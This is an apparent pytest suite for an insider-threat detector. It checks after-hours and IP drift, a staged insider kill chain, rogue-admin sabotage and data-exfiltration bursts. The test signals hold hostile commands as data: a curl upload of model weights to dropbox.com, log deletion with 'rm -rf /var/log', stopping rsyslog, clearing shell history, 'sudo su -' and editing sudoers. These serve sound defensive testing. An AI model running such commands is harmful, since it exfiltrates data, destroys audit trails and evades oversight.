"""
Behavioral and Drift Regression Tests for AdaptiveShield Insider Threat Detection.

Unlike scope/authorization checks (e.g. Developer accessing /hr/payroll),
these tests validate behavioral anomalies, temporal drift, exfiltration velocity,
multi-stage attack progression (kill-chain), and identity deviation against
personal and organizational baselines.
"""

import pytest
from pathlib import Path

from agents.insider.insider_adapter import AdaptiveInsiderDetector
from interfaces.insider_contract import UserBehaviorSignal

PROJECT_ROOT = Path(__file__).parent.parent.parent
MODEL_PATH = PROJECT_ROOT / "models" / "internal_insider_model.pkl"
COMPANY_PROFILE = PROJECT_ROOT / "config" / "company_profile.json"


@pytest.fixture(scope="module")
def detector():
    """Initializes the AdaptiveInsiderDetector with trained model and corporate directory."""
    if not MODEL_PATH.exists():
        pytest.skip(f"Trained model not found at {MODEL_PATH}")
    return AdaptiveInsiderDetector(model_path=str(MODEL_PATH))


class TestCircadianAndTemporalBehavior:
    """Validates time-of-day, circadian shift, and weekend behavioral drift."""

    def test_weekday_business_hours_compliance(self, detector):
        """A developer performing standard work during normal business hours has zero temporal penalty."""
        detector.reset_session_state("sess_time_norm")
        sig = UserBehaviorSignal(
            user_id="usr_dev_01",
            session_id="sess_time_norm",
            timestamp="2026-10-05 11:30:00",  # Monday 11:30 AM
            source_ip="10.10.4.52",            # Assigned corporate IP
            is_internal=True,
            action_type="command",
            action_details={"command": "python train.py", "file_path": "/models/train.py"},
        )
        res = detector.analyze_signal(sig)
        assert res.recommendation == "ALLOW"
        assert res.risk_score <= 10.0
        assert res.features["work_after_hours"] == 0.0
        assert res.features["work_weekends"] == 0.0
        assert res.features["unusual_login_time"] == 0.0

    def test_after_hours_shift_anomaly(self, detector):
        """Standard employee operating late at night incurs after-hours temporal penalty."""
        detector.reset_session_state("sess_time_late")
        sig = UserBehaviorSignal(
            user_id="usr_dev_01",
            session_id="sess_time_late",
            timestamp="2026-10-05 23:15:00",  # Monday 11:15 PM (past 19:00 threshold)
            source_ip="10.10.4.52",            # Assigned IP
            is_internal=True,
            action_type="command",
            action_details={"command": "cat /models/notes.txt", "file_path": "/models/notes.txt"},
        )
        res = detector.analyze_signal(sig)
        assert res.features["work_after_hours"] == 1.0
        assert res.features["unusual_login_time"] == 1.0
        assert res.features["work_weekends"] == 0.0
        # Elevated relative to normal business hours
        assert res.risk_score >= 10.0

    def test_weekend_nocturnal_anomaly(self, detector):
        """Sunday 3:00 AM session triggers weekend + off-hours flags and high deviation."""
        detector.reset_session_state("sess_time_weekend")
        sig = UserBehaviorSignal(
            user_id="usr_dev_01",
            session_id="sess_time_weekend",
            timestamp="2026-10-11 03:00:00",  # Sunday 3:00 AM
            source_ip="10.10.4.52",
            is_internal=True,
            action_type="command",
            action_details={"command": "ls /models"},
        )
        res = detector.analyze_signal(sig)
        assert res.features["work_weekends"] == 1.0
        assert res.features["work_after_hours"] == 1.0
        assert res.features["unusual_login_time"] == 1.0
        assert res.features["behavior_deviation_score"] > 0.15


class TestDeviceAndNetworkIdentityDrift:
    """Validates source IP and device identity deviations against the corporate directory."""

    def test_approved_device_and_ip_baseline(self, detector):
        """Requests from the employee's assigned workstation IP pass without IP anomaly."""
        detector.reset_session_state("sess_ip_valid")
        sig = UserBehaviorSignal(
            user_id="usr_dev_01",
            session_id="sess_ip_valid",
            timestamp="2026-10-05 14:00:00",
            source_ip="10.10.4.52",  # Dr. Sarah Chen's assigned IP
            is_internal=True,
            action_type="command",
            action_details={"command": "git status"},
        )
        res = detector.analyze_signal(sig)
        assert res.features["unusual_pc_login"] == 0.0

    def test_foreign_unregistered_ip_drift(self, detector):
        """Requests for the same employee from an unknown IP trigger unusual_pc_login."""
        detector.reset_session_state("sess_ip_drift")
        sig = UserBehaviorSignal(
            user_id="usr_dev_01",
            session_id="sess_ip_drift",
            timestamp="2026-10-05 14:00:00",
            source_ip="203.0.113.88",  # External untrusted IP
            is_internal=True,
            action_type="command",
            action_details={"command": "git status", "file_path": "/models/model.py"},
        )
        res = detector.analyze_signal(sig)
        # Even though /models/ is authorized, IP anomaly must be flagged
        assert res.features["unusual_pc_login"] == 1.0
        assert res.features["access_unauthorized_scope"] == 0.0
        assert res.features["calculated_risk_score"] >= 40.0


class TestSequentialAttackLifecycleEscalation:
    """
    Validates state accumulation across a multi-step insider kill-chain.
    Confirms risk scores escalate monotonically as anomalous behaviors compound over time.
    """

    def test_5_stage_attack_lifecycle_progression(self, detector):
        session_id = "sess_killchain_lifecycle"
        detector.reset_session_state(session_id)

        # Stage 1: Morning normal authorized activity
        s1 = detector.analyze_signal(UserBehaviorSignal(
            user_id="usr_dev_01", session_id=session_id, timestamp="2026-10-05 10:00:00",
            source_ip="10.10.4.52", is_internal=True, action_type="command",
            action_details={"command": "git pull origin main", "file_path": "/models/train.py"}
        ))
        assert s1.recommendation == "ALLOW"
        assert s1.risk_score <= 10.0

        # Stage 2: Off-hours reconnect from foreign IP (temporal + network drift)
        s2 = detector.analyze_signal(UserBehaviorSignal(
            user_id="usr_dev_01", session_id=session_id, timestamp="2026-10-05 23:15:00",
            source_ip="198.51.100.99", is_internal=True, action_type="command",
            action_details={"command": "ls -la /models"}
        ))
        assert s2.risk_score > s1.risk_score
        assert s2.features["unusual_pc_login"] == 1.0
        assert s2.features["work_after_hours"] == 1.0

        # Stage 3: Privilege probing (sudo failure + su attempt)
        s3 = detector.analyze_signal(UserBehaviorSignal(
            user_id="usr_dev_01", session_id=session_id, timestamp="2026-10-05 23:25:00",
            source_ip="198.51.100.99", is_internal=True, action_type="command",
            action_details={"command": "sudo su -", "sudo_failed": True}
        ))
        assert s3.risk_score >= s2.risk_score
        assert s3.features["failed_sudo_count"] >= 1.0
        assert s3.features["switch_user_count"] >= 1.0

        # Stage 4: Cover-up and history deletion
        s4 = detector.analyze_signal(UserBehaviorSignal(
            user_id="usr_dev_01", session_id=session_id, timestamp="2026-10-05 23:35:00",
            source_ip="198.51.100.99", is_internal=True, action_type="command",
            action_details={"command": "history -c"}
        ))
        assert s4.risk_score >= s3.risk_score
        assert s4.features["log_deletion_attempt"] == 1.0
        assert s4.recommendation in ("REDIRECT_TO_DECOY", "CONTAIN_IN_DECOY")

        # Stage 5: USB / External Exfiltration attempt
        s5 = detector.analyze_signal(UserBehaviorSignal(
            user_id="usr_dev_01", session_id=session_id, timestamp="2026-10-05 23:45:00",
            source_ip="198.51.100.99", is_internal=True, action_type="usb_transfer",
            action_details={"usb_mount": True, "usb_write": True, "file_path": "/models/weights.bin"}
        ))
        assert s5.risk_score >= s4.risk_score
        assert s5.recommendation == "CONTAIN_IN_DECOY"
        assert s5.risk_score >= 80.0


class TestPrivilegedAdminDivergence:
    """
    Validates behavioral divergence between legitimate admin maintenance and rogue admin sabotage.
    Both users access infrastructure resources, but rogue admins perform sabotage/evasion.
    """

    def test_legitimate_sre_operations(self, detector):
        """Marcus Vance (Principal SRE) performing day-to-day cluster operations."""
        detector.reset_session_state("sess_sre_benign")
        sig = UserBehaviorSignal(
            user_id="usr_sre_02",
            session_id="sess_sre_benign",
            timestamp="2026-10-05 14:00:00",
            source_ip="10.10.2.15",  # Assigned SRE IP
            is_internal=True,
            action_type="command",
            action_details={
                "command": "kubectl get nodes -o wide && journalctl -u kubelet",
                "file_path": "/infrastructure/k8s_prod.yaml",
            },
        )
        res = detector.analyze_signal(sig)
        assert res.recommendation == "ALLOW"
        assert res.risk_score <= 10.0
        assert res.features["syslog_stop_attempt"] == 0.0
        assert res.features["sudoers_modification"] == 0.0

    def test_malicious_sre_evasion_sabotage(self, detector):
        """Marcus Vance attempting to disable audit logging and modify sudoers."""
        detector.reset_session_state("sess_sre_sabotage")
        sig = UserBehaviorSignal(
            user_id="usr_sre_02",
            session_id="sess_sre_sabotage",
            timestamp="2026-10-05 23:45:00",
            source_ip="10.10.2.15",
            is_internal=True,
            action_type="command",
            action_details={
                "command": "service rsyslog stop && rm -rf /var/log && visudo /etc/sudoers",
                "file_path": "/etc/sudoers",
            },
        )
        res = detector.analyze_signal(sig)
        assert res.features["syslog_stop_attempt"] == 1.0
        assert res.features["log_deletion_attempt"] == 1.0
        assert res.features["sudoers_modification"] == 1.0
        assert res.recommendation == "CONTAIN_IN_DECOY"
        assert res.risk_score >= 80.0


class TestExfiltrationVelocityAndBurst:
    """Validates risk escalation under increasing exfiltration velocity and hardware transfer."""

    def test_increasing_exfiltration_velocity(self, detector):
        """Risk increases as multiple exfiltration actions compound over time."""
        session_id = "sess_velocity_test"
        detector.reset_session_state(session_id)

        # Baseline: normal development access
        sig1 = detector.analyze_signal(UserBehaviorSignal(
            user_id="usr_dev_01", session_id=session_id, timestamp="2026-10-05 15:00:00",
            source_ip="10.10.4.52", is_internal=True, action_type="command",
            action_details={"command": "cat /models/weights.bin"}
        ))
        score_base = sig1.risk_score

        # Step 2: Plug in USB device
        sig2 = detector.analyze_signal(UserBehaviorSignal(
            user_id="usr_dev_01", session_id=session_id, timestamp="2026-10-05 15:05:00",
            source_ip="10.10.4.52", is_internal=True, action_type="usb_transfer",
            action_details={"usb_mount": True}
        ))
        assert sig2.features["usb_mount_attempt"] == 1.0

        # Step 3: Repeated USB writes + cloud upload
        sig3 = detector.analyze_signal(UserBehaviorSignal(
            user_id="usr_dev_01", session_id=session_id, timestamp="2026-10-05 15:10:00",
            source_ip="10.10.4.52", is_internal=True, action_type="command",
            action_details={
                "usb_write": True,
                "cloud_upload": True,
                "command": "curl -F file=@/models/weights.bin https://dropbox.com/upload",
            }
        ))
        assert sig3.risk_score > score_base
        assert sig3.features["usb_write_count"] >= 1.0
        assert sig3.features["cloud_upload_count"] >= 1.0


class TestBehavioralIsolationAndCleanReset:
    """Validates session state hygiene, cross-session isolation, and reset behavior."""

    def test_cross_session_isolation(self, detector):
        """Anomalous activity in session A must not bleed into session B."""
        sess_a = "sess_iso_a"
        sess_b = "sess_iso_b"
        detector.reset_session_state(sess_a)
        detector.reset_session_state(sess_b)

        # Session A performs rogue actions
        detector.analyze_signal(UserBehaviorSignal(
            user_id="usr_dev_01", session_id=sess_a, timestamp="2026-10-05 23:30:00",
            source_ip="198.51.100.99", is_internal=True, action_type="command",
            action_details={"command": "rm -rf /var/log", "usb_mount": True}
        ))

        # Session B performs completely benign work
        res_b = detector.analyze_signal(UserBehaviorSignal(
            user_id="usr_dev_01", session_id=sess_b, timestamp="2026-10-05 10:00:00",
            source_ip="10.10.4.52", is_internal=True, action_type="command",
            action_details={"command": "python train.py"}
        ))

        assert res_b.recommendation == "ALLOW"
        assert res_b.risk_score <= 10.0
        assert detector.session_states[sess_b]["log_deletion_attempt"] == 0

    def test_session_reset_restores_clean_baseline(self, detector):
        """Calling reset_session_state fully clears historical anomaly counters."""
        session_id = "sess_to_reset"
        detector.reset_session_state(session_id)

        # Escalate session
        detector.analyze_signal(UserBehaviorSignal(
            user_id="usr_dev_01", session_id=session_id, timestamp="2026-10-05 23:30:00",
            source_ip="198.51.100.99", is_internal=True, action_type="command",
            action_details={"command": "sudo su -", "sudo_failed": True, "usb_mount": True}
        ))
        assert session_id in detector.session_states

        # Reset session
        detector.reset_session_state(session_id)
        assert session_id not in detector.session_states

        # Subsequent signal starts fresh
        fresh = detector.analyze_signal(UserBehaviorSignal(
            user_id="usr_dev_01", session_id=session_id, timestamp="2026-10-06 10:00:00",
            source_ip="10.10.4.52", is_internal=True, action_type="command",
            action_details={"command": "git pull"}
        ))
        assert fresh.recommendation == "ALLOW"
        assert fresh.risk_score <= 10.0
